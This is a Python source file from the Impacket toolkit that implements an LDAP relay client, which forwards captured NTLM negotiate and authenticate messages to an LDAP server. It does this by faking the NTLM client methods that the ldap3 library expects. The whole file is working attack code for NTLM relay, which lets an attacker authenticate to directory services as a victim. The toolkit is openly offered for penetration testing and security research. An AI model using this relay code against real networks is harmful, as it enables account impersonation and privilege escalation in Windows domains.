#!/usr/bin/python
# Copyright (c) 2003-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
#
# Description: 
# LDAP client for relaying NTLMSSP authentication to LDAP servers
# The way of using the ldap3 library is quite hacky, but its the best
# way to make the lib do things it wasn't designed to without touching
# its code
#
from ldap3 import Server, Connection, ALL, NTLM, RESULT_SUCCESS, MODIFY_ADD
from ldap3.operation import bind


class LDAPRelayClient:
    MODIFY_ADD = MODIFY_ADD
    def __init__(self,server,port=None):
        self.target = server
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.s = None
        self.c = None

    def init_connection(self):
        self.s = Server(self.target, get_info=ALL)
        self.c = Connection(self.s, user="a", password="b", authentication=NTLM)
        self.c.open(False)

    def sendNegotiate(self,negotiateMessage):
        self.negotiateMessage = negotiateMessage
        self.init_connection()
        with self.c.lock:
            result = None
            if not self.c.sasl_in_progress:
                self.c.sasl_in_progress = True
                request = bind.bind_operation(self.c.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.c.post_send_single_response(self.c.send('bindRequest', request, None))
                result = response[0]
                sicily_packages = result['server_creds'].decode('ascii').split(';')
                if 'NTLM' in sicily_packages:  # NTLM available on server
                    request = bind.bind_operation(self.c.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.c.post_send_single_response(self.c.send('bindRequest', request, None))
                    result = response[0]
                    if result['result'] == RESULT_SUCCESS:
                        return result['server_creds']

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_negotiate_message(self):
        return self.negotiateMessage

    def sendAuth(self,authenticateMessageBlob, serverChallenge=None): 
        with self.c.lock:
            result = None
            self.authenticateMessageBlob = authenticateMessageBlob
            request = bind.bind_operation(self.c.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.c.post_send_single_response(self.c.send('bindRequest', request, None))
            result = response[0]
        self.c.sasl_in_progress = False
        if result['result'] == RESULT_SUCCESS:
            self.c.bound = True 
            self.c.refresh_server_info()
        return result

    #This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_authenticate_message(self):
        return self.authenticateMessageBlob

    #Placeholder function for ldap3
    def parse_challenge_message(self,message):
        pass

    #SMB Relay server needs this
    @staticmethod
    def get_encryption_key():
        return None